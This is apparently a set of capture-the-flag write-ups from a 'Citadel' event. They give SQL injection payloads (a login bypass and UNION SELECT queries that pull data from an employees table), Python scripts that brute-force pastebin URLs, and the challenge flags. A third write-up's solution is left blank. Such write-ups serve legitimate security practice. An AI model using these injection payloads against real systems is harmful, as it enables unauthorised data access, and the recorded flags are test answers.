After your legendary battle with the artist, the virtual world has returned, stretching around you in endless grids and flickering data, you find a rogue data terminal and on careful inspection, you find you’re able to inject rogue structured queries. Using this critical vulnerability, find a way to extract the hidden passcode.

Challenge: https://databaseincursion.citadel.cryptonitemit.in

## Solution:

- The website is a classic login form vulnerable to SQL injection.
  
  <img width="2940" height="1610" alt="image" src="https://github.com/user-attachments/assets/49e1344e-ea9f-4691-bd2f-9ab6bd7a63d2" />
  
- `' OR '1'='1` in the username while leaving the password empty to confirm SQL injection vulnerability. This leads to the following webpage.
  
  <img width="2940" height="1606" alt="image" src="https://github.com/user-attachments/assets/3e69f89f-319b-4174-94ff-ef062554561e" />
  
- As someone from management has the flag, `' UNION SELECT name FROM sqlite_master --` but system tables have been blocked.

  <img width="2940" height="1600" alt="image" src="https://github.com/user-attachments/assets/0fb7b471-409d-41b5-b7a2-31d14057c9df" />

- `Management' OR department='Management' --` to search for the management department.

  <img width="2940" height="1598" alt="image" src="https://github.com/user-attachments/assets/da22e9a9-3130-4fc4-b400-2e30448e4084" />

- `Kiwi' OR name='Kiwi' --` to search for her. The flag isn't shown in the results.

  <img width="2940" height="1594" alt="image" src="https://github.com/user-attachments/assets/f971b8e0-7033-424f-848b-d744fe056154" />

- `' UNION SELECT 1,name,department,email,notes FROM employees WHERE name='Kiwi' --` to check all the data about Kiwi. The flag is shown.

  <img width="2940" height="1592" alt="image" src="https://github.com/user-attachments/assets/547ad08c-b7ce-4339-875d-7abcc423f12d" />

## Flag: 

```
citadel{wh3n_w1ll_y0u_f1nd_0u7_1f_175_5ql_0r_53qu3l?}
```

### References:

- 

### Notes:

- 



# BRATCHA

Author: teayah

Category: Miscellaneous

Difficulty: Medium

A clear chime rolls through the chamber and a new crest ignites on your badge – a quiet promotion. The outer ring is behind you. From here, the Citadel opens its inner systems, and the locks grow heavier because the keys are worth more. Your answers now carry more weight – and earn more in return. The citadel welcomes you to the inner climb.

Near the gate to the next floor you come across a CAPTCHA verification test, but it has been covered by scratches on the decaying wall and misleading letters stopping you from finding the correct key, all to prove you’re human.

## Solution:

- The image given below is given in the challenge.

  <img width="1440" height="1898" alt="image" src="https://github.com/user-attachments/assets/9f614a65-1e6b-491b-9021-6dccd96ed829" />

- Letters are overlapping each other in the link.
  pastebin.com/_ _ _ _ _ _ _ _
  1 - s or c
  2 - g or q
  3 - x or y
  4- h or n
  5 - x or v
  6 - B or D
  7 - h or n
  8 - Z or S
- There are a total of 2^8 combinations so a code is required.
- 1st attempt:
  ```sh
  import requests
  import itertools

  chars = [ ['s', 'c'], ['g', 'q'], ['x', 'y'], ['h', 'n'], ['x', 'v'], ['B', 'D'], ['h', 'n'], ['Z', 'S']]

  for combo in itertools.product(*chars):
      code = ''.join(combo)
      url = f"https://pastebin.com/raw/{code}"
      r = requests.get(url)
      if r.status_code == 200:
          print(f"Found: {code}")
          print("Content:")
          print(r.text)
          break
  ```
- The 1st attempt's code results in:
  ```sh
  nehanandini@Nehas-MacBook-Air ~ % /opt/homebrew/bin/python3 /Users/nehanandini/Downloads/testflag.py
  Traceback (most recent call last):
    File "/Users/nehanandini/Downloads/testflag.py", line 1, in <module>
      import requests
  ModuleNotFoundError: No module named 'requests'
  ```
- Either install `requests` or use `urlllib` which is inbuilt.
- Going with 2nd option, 2nd attempt:
  ```sh
  import urllib.request
  import itertools

  chars = [ ['s', 'c'], ['g', 'q'], ['x', 'y'], ['h', 'n'], ['x', 'v'], ['B', 'D'], ['h', 'n'], ['Z', 'S']]

  for combo in itertools.product(*chars):
      code = ''.join(combo)
      url = f"https://pastebin.com/raw/{code}"
      try:
          with urllib.request.urlopen(url) as response:
              if response.getcode() == 200:
                  content = response.read().decode('utf-8')
                  print(f"Found: {code}")
                  print("Content:")
                  print(content)
                  break
      except:
          pass
  ```
  The above runs but isnt producing any output. Either its trying all combinations and none are valid or its running way too slow.
- 3rd attempt:
  ```sh
  import urllib.request
  import itertools

  chars = [ ['s', 'c'], ['g', 'q'], ['x', 'y'], ['h', 'n'], ['x', 'v'], ['B', 'D'], ['h', 'n'], ['Z', 'S']]

  count = 0
  total = 2**8  # 256 combinations

  for combo in itertools.product(*chars):
      count += 1
      code = ''.join(combo)
      url = f"https://pastebin.com/raw/{code}"
    
      if count % 10 == 0:
          print(f"Trying {count}/{total}: {code}")
    
      try:
          with urllib.request.urlopen(url, timeout=5) as response:
              if response.getcode() == 200:
                  content = response.read().decode('utf-8')
                  print(f"Found: {code}")
                  print("Content:")
                  print(content)
                  break
      except Exception as e:
          pass

  print("Search completed.")
  ```
- The 3rd attempt's code results in printing which combination it was and the flag.
  ```sh
  nehanandini@Nehas-MacBook-Air ~ % /opt/homebrew/bin/python3 /Users/nehanandini/Downloads/testflag.py
  Found: sqxnxBhZ
  Content:
  Congrats!
  You've proven you're human.

  Here's your flag:
  citadel{1m_3v3rywh3r3_1m_s0_jul1a}?
  ```

## Flag: 

```
citadel{1m_3v3rywh3r3_1m_s0_jul1a}
```

### References:

- 

### Notes:

- 



# Case Sensitivity

Author: Guitaristsam

Category: Misc

Difficulty: Medium

200
You step into a constricted floor where every movement and operation is limited. Commands are few, space is tight, and options are restricted.

A guardian looms over the floor, its body shifting like liquid metal, enforcing these constraints. It watches your every move, daring you to make do with what you have and uncover the passcode to the next floor despite the restrictions.

Connection: `nc chall_citadel.cryptonitemit.in 32770`

## Solution:

- The following is shown once `nc chall_citadel.cryptonitemit.in 32770` is run in the terminal.

  <img width="1130" height="112" alt="image" src="https://github.com/user-attachments/assets/9741500e-bb12-46c0-b47a-99ffabf61de1" />

- 

## Flag: 

```
citadel{d34th_d035_n07_fr33_y0u_fr0m_7h3_gu17ar15t}
```

### References:

- 

### Notes:

- 









